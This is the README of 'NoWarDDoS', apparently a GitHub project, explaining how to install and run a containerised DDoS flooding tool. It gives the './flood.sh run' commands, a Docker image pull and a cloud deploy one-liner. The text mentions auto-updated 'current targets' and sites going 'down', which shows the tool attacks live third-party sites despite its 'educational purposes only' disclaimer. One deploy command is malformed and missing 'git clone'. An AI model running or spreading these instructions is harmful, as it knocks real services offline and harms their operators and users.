[Ukrainian](https://github.com/AlexTrushkovsky/NoWarDDoS/blob/main/README.md) | [Russian](https://github.com/AlexTrushkovsky/NoWarDDoS/blob/main/README_ru.md) | [Korean](https://github.com/AlexTrushkovsky/NoWarDDoS/blob/main/README_ko.md) | [French](https://github.com/AlexTrushkovsky/NoWarDDoS/blob/main/README_fr.md) | [Portuguese](https://github.com/AlexTrushkovsky/NoWarDDoS/blob/main/README_pt.md) 

# <b1>English:</b1>
# NoWarDDoS
**Warning! Use only for educational purposes. You can try a DDOS attack only on your own resource.<br/>
Using DDOS attacks on other sites is illegal and punishable by law.**
<br />
<br />▪ Install Python 3.8+ (mandatory enable "Add to path")
![alt text](https://miro.medium.com/max/1344/0*7nOyowsPsGI19pZT.png)
<br />▪ Open terminal, unpack archive
<br />▪ In root directory run next command:
```
1). run -> Run containers. Example: ./flood.sh run 3 #Where '3' is the number of containers
2). status -> Displays the status of how many containers are running. Example: ./flood.sh status
3). log -> Displays the log of the first running container. Example: ./flood.sh logs
4). net -> Show current traffic through nload eth0. Example: ./flood.sh logs net
5). stop -> Stops running containers. Example: ./flood.sh stop
```
Containers will be launched and automatically reloaded and updated.

Note: the speed is very dependent on the current targets, the slower the sites work, the slower the speed will be.
The more of them down - the speed can also be less

<br />If it throws an error related to **ModuleNotFoundError** or others, try:
```
Windows: python -m pip install --upgrade pip
         pip install -r requirements.txt
         
macOS/Linux: python3 -m pip install --upgrade pip
             pip3 install -r requirements.txt
```

<br />If you have any problems, I will help you, please contact via **Telegram:** @esen1n25
## Finished image `Docker`:
```shell
docker pull registry.gitlab.com/a_gonda/nowarddos:latest
```

## Deploy to a new instance in the cloud:
```shell
https://gitlab.com/a_gonda/nowarddos.git && cd nowarddos/ && ./flood.sh run 3 
#starts 3 containers with auto-update and auto-restart
```
